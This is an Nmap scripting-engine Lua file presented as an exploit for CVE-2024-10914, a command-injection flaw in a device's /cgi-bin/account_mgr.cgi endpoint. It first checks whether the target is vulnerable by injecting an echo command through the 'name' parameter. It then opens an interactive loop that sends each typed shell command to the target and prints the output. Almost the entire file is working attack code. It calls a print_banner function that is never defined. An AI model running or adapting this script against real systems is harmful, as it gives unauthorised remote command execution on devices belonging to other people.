local http = require "http"
local stdnse = require "stdnse"
local string = require "string"
local shortport = require "shortport"

description = [[
Exploit for CVE-2024-10914.
Checks if the target is vulnerable to command injection in the /cgi-bin/account_mgr.cgi endpoint and optionally exploits it to execute commands.
]]

author = "alexis"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit", "intrusive"}

-- Script Arguments:
-- url: target URL (e.g., "http://target.com")
-- ignore_cert: if true, ignore SSL certificate errors

portrule = shortport.http


local function verify(url)
    stdnse.print_debug(1, "[!] Checking if target is vulnerable...")

    local verify_string = ""
    for i=1,5 do
        verify_string = verify_string .. string.char(math.random(97, 122))
    end

    local cmd = "echo " .. verify_string
    local endpoint = url .. "/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;" .. cmd .. ";%27"

    local response = http.get({url = endpoint})
    if response.status == 200 and response.body:find(verify_string) then
        stdnse.print_debug(1, "[+] Vulnerable")
        return true
    else 
        stdnse.print_debug(1, "[-] Not vulnerable\n[-] Exiting...")
        return false
    end
end

local function exploit(url)
    while true do
        io.write("$ ")
        local cmd = io.read()

        local endpoint = url .. "/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;" .. cmd .. ";%27"
        local response = http.get({url = endpoint})

        if response.status == 200 then
            print(response.body)
        else
            print("[-] Command failed")
        end

        if cmd == "exit" then
            break
        end
    end
end

action = function(host, port)
    local url = "http://" .. host.targetname .. ":" .. port.number
    local ignore_cert = stdnse.get_script_args("ignore-cert") or false

    print_banner()
    
    if verify(url) then
        local proceed = stdnse.get_script_args("proceed") or "y"
        if proceed == "y" then
            exploit(url)
        else
            stdnse.print_debug(1, "[!] Bye...")
        end
    end

    return "Scan completed"
end
